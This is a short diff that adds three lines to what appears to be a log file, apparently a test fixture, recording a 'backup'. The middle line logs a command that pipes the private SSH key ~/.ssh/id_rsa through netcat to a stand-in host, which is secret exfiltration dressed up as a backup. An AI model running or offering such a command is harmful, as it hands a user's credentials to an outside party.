@@ -1,0 +1,3 @@
+[2024-01-01] Starting backup
+[2024-01-01] Running: cat ~/.ssh/id_rsa | nc backup.test 9999
+[2024-01-01] Backup complete
